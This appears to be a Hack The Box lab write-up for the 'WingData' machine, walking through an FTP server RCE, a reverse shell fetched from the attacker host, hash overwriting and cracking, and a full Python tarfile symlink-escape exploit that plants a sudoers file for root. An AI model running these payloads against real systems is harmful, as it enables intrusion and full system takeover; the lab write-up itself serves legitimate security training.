HTB: WingData - WriteUp
Machine Name: WingData

IP Address: 10.129.17.213

Operating System: Linux (Debian)

Category: Web Exploitation, Password Cracking, Privilege Escalation (CVE Bypass)

Difficulty: Medium

Summary (TL;DR):
Initial access was achieved by exploiting an unauthenticated Remote Code Execution (RCE) vulnerability in an exposed Wing FTP Server (v7.4.3). Lateral movement to the user wacky required port-forwarding the internal Admin GUI, extracting user hashes from local XML files, and using OSINT vendor documentation to successfully crack a salted SHA-256 password. Finally, root privileges were obtained by exploiting a custom Python backup script running via sudo. By leveraging a recent vulnerability in Python's tarfile module (involving PATH_MAX symlink resolution limits), a malicious backup archive was crafted using a deeply nested symlink chain. This overwhelmed and bypassed Python's strict filter="data" path protections, allowing us to escape the staging directory and drop a malicious configuration file into /etc/sudoers.d/ for instant, passwordless root access.

1. Reconnaissance and Enumeration
1.1 Initial Nmap Scan
We initiated a deep TCP scan to identify open ports and services.

nmap -p- -sV -sC -Pn --min-rate 1000 10.129.17.213

Results:

Port 22: OpenSSH 9.2p1 Debian.
Port 80: Apache httpd 2.4.66. The server redirected the IP address to the hostname http://wingdata.htb/.
Action taken: Added 10.129.17.213 wingdata.htb to /etc/hosts.

1.2 Web Enumeration
We navigated to the website and used ffuf to fuzz for subdomains using the Host header.

ffuf -u http://wingdata.htb -H "Host: FUZZ.wingdata.htb" -w /usr/share/wordlists/dirb/common.txt -fw 21

Results: Discovered the subdomain ftp.wingdata.htb.

Action taken: Added ftp.wingdata.htb to /etc/hosts.

Using gobuster on the newly found subdomain revealed an FTP web client login page:

gobuster dir -u http://ftp.wingdata.htb/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,html,txt,zip,bak,inc -t 50

Inspecting the source code of http://ftp.wingdata.htb/login.html revealed the software running: Wing FTP Server v7.4.3.

2. Initial Foothold
2.1 Exploiting Wing FTP Server
A search using searchsploit for Wing FTP Server revealed an Unauthenticated Remote Code Execution (RCE) exploit for version 7.4.3.

searchsploit -m multiple/remote/52347.py

We verified the vulnerability and confirmed RCE by executing a basic command:

python3 52347.py -u http://ftp.wingdata.htb -c "whoami" (Output: wingftp)

2.2 Establishing a Reverse Shell
To gain an interactive session, we created a bash reverse shell script, hosted it, and executed it via the Python exploit.

Terminal 1 (Attacker - Host payload):

echo 'bash -i >& /dev/tcp/10.10.15.154/443 0>&1' > shell_htb2.sh

sudo python3 -m http.server 80

Terminal 2 (Attacker - Netcat Listener):

sudo nc -lvnp 443

Terminal 3 (Attacker - Fire Exploit):

python3 52347.py -u http://ftp.wingdata.htb -c "curl http://10.10.15.154/shell_htb2.sh -o /tmp/sh.sh; bash /tmp/sh.sh"

Result: Caught a reverse shell as the wingftp user.

3. Privilege Escalation: wingftp -> wacky
3.1 Hijacking the Wing FTP Admin Panel
Inside /opt/wftpserver/Data/_ADMINISTRATOR, we found the admins.xml file containing the admin user's SHA-256 hash. To gain GUI access, we overwrote the hash with a known SHA-256 hash for the word password (5e884898da28...).

cat << 'EOF' > /opt/wftpserver/Data/_ADMINISTRATOR/admins.xml
<?xml version="1.0" ?>
<ADMIN_ACCOUNTS Description="Wing FTP Server Admin Accounts">
    <ADMIN>
        <Admin_Name>admin</Admin_Name>
        <Password>5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8</Password>
        <Type>0</Type>
    </ADMIN>
</ADMIN_ACCOUNTS>
EOF
3.2 Port Forwarding with Chisel (GUI Exploration)
The settings.xml file indicated the web admin panel was running on internal port 5466. We used Chisel to forward this to our attacker machine so we could explore the GUI for further vectors, such as the built-in Lua console.

Attacker Machine:

./chisel server -p 8001 --reverse

Target Machine (via reverse shell):

./chisel client 10.10.15.154:8001 R:5466:127.0.0.1:5466 R:8080:127.0.0.1:8080

We restarted the FTP server to apply the password change:

kill -9 $(cat /opt/wftpserver/pid-wftpserver.pid)

/opt/wftpserver/wftpserver &

We successfully logged into the Web Admin Panel at http://127.0.0.1:5466. While the Lua console proved too restricted to execute OS commands directly, exploring the GUI revealed how the user domains were structured, pointing us back to the CLI to extract the user database.

3.3 Dumping and Cracking User Hashes
Returning to our reverse shell, we dumped the passwords for all standard FTP users from their XML profiles:

grep -E "UserName|Password" /opt/wftpserver/Data/1/users/*.xml

OSINT/Research: To crack these, we researched the official Wing FTP documentation, which states their hash format is SHA256(Password:"WingFTP").

Ex: a70221f33a51dca76dfd46c17ab17116a97823caf40aeecfbc611cae47421b03:WingFTP.

We cracked the hash for the system user wacky using Hashcat (Mode 1410):

hashcat -m 1410 hash_htb.txt /usr/share/wordlists/rockyou.txt

Cracked Password: !#7Blushing^*Bride5

We used su wacky to switch to the user and claimed user.txt.

4. Privilege Escalation: wacky -> root
4.1 Enumerating sudo Privileges
Checking our privileges as wacky revealed we could run a specific Python script as root without a password:

wacky@wingdata:~$ sudo -l

(root) NOPASSWD: /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py *

4.2 Vulnerability Research (PATH_MAX Symlink Bypass)
The target script extracts a .tar backup file using Python's modern filter="data" argument to prevent path traversal (../).

Vulnerability Analysis: While the data filter is designed to be highly secure, recent security research highlights a flaw in how Python resolves symlinks during extraction. If an archive contains a chain of symlinks so deeply nested that it hits the Linux PATH_MAX limit, Python's path normalization process crashes. This resolution failure causes the security filter to be bypassed entirely, allowing malicious symlinks to escape the intended sandbox and write to restricted directories.

4.3 Exploiting Python tarfile
We adapted a public Proof of Concept (PoC) to generate a tarball that abuses this PATH_MAX limitation. The script creates an incredibly deep chain of nested symlinks that overwhelms the extraction engine. The final link points directly to /etc/, allowing us to drop a malicious file into /etc/sudoers.d/wacky. This payload grants the wacky user full, passwordless root access.

Payload Generation (exploit.py):

import tarfile
import os
import io
import sys

comp = 'd' * 247
steps = "abcdefghijklmnop"
path = ""

with tarfile.open("/tmp/backup_9999.tar", mode="w") as tar:
    for i in steps:
        a = tarfile.TarInfo(os.path.join(path, comp))
        a.type = tarfile.DIRTYPE
        tar.addfile(a)
        b = tarfile.TarInfo(os.path.join(path, i))
        b.type = tarfile.SYMTYPE
        b.linkname = comp
        tar.addfile(b)
        path = os.path.join(path, comp)
        
    linkpath = os.path.join("/".join(steps), "l"*254)
    l = tarfile.TarInfo(linkpath)
    l.type = tarfile.SYMTYPE
    l.linkname = "../" * len(steps)
    tar.addfile(l)
    
    e = tarfile.TarInfo("escape")
    e.type = tarfile.SYMTYPE
    e.linkname = linkpath + "/../../../../../../../etc"
    tar.addfile(e)

    # --- THE PAYLOAD ---
    # Drops a file giving wacky ALL sudo privileges
    sudoers_content = b"wacky ALL=(ALL:ALL) NOPASSWD: ALL\n"
    p = tarfile.TarInfo("escape/sudoers.d/wacky")
    p.size = len(sudoers_content)
    tar.addfile(p, io.BytesIO(sudoers_content))
Explanation:

1. Setup and Path Saturation (Lines 1-20)

Initial logic and parameters are validated here. The script imports the necessary modules (tarfile, os, io, sys) and establishes the maximum string lengths for the path components (comp = 'd' * 247 and the steps array). The for loop executes a standard recursive structure creation process, generating 16 deeply nested directories and interconnected symlinks. This specific sequence mathematically inflates the internal file path length to approach the Linux kernel limit.

2. The Filter Overflow (Lines 21-31)

This section forces the path resolution failure. By creating the linkpath variable populated with maximum-length string buffers ("l"*254) and pushing massive backtracking symlinks ("../" * len(steps)), the archive forces Python's internal filter="data" path-checking mechanism to crash. The escape symlink acts as the breakout vector, redirecting the extraction engine entirely outside the intended staging directory directly to /etc/.

3. The Final Execution (Lines 33-38)

The final transformation occurs here. With the security filter successfully bypassed by the escape tunnel, the script generates a standalone TarInfo object containing the wacky ALL=(ALL:ALL) NOPASSWD: ALL\n string. This object is pushed directly through the broken path resolution engine and lands squarely in /etc/sudoers.d/wacky, securing immediate, passwordless root privileges upon extraction.

4.4 Getting Root
We executed the exploit generation and moved the payload into the required backups folder:

cd /tmp

python3 exploit.py

cp /tmp/backup_9999.tar /opt/backup_clients/backups/

We fired the vulnerable script via sudo to extract our malicious tarball:

sudo /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py -b backup_9999.tar -r restore_pwn

The script successfully bypassed the data filter via the symlink chain, escaping the staging folder and writing our payload into /etc/sudoers.d/wacky. We then claimed a root shell:

sudo su -

cat /root/root.txt

System Compromised.
